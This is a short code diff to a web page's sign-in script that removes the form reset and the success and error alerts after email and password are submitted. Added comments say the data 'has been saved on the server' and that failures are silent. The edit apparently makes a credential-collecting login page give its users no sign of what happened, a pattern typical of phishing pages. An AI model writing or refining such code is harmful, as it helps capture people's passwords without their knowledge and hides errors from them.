@@ -199,16 +199,12 @@
                         const result = await response.json();
                         
                         if (result.success) {
-                            // Clear the form
-                            document.getElementById('email').value = '';
-                            document.getElementById('password').value = '';
-                            
-                            // Show success message (optional)
-                            alert('Sign in successful!');
+                            // Do nothing - just stay on the page
+                            // Data has been saved on the server
                         }
                     } catch (error) {
                         console.error('Error:', error);
-                        alert('An error occurred. Please try again.');
+                        // Silently fail - stay on the page
                     }
                 }
             });
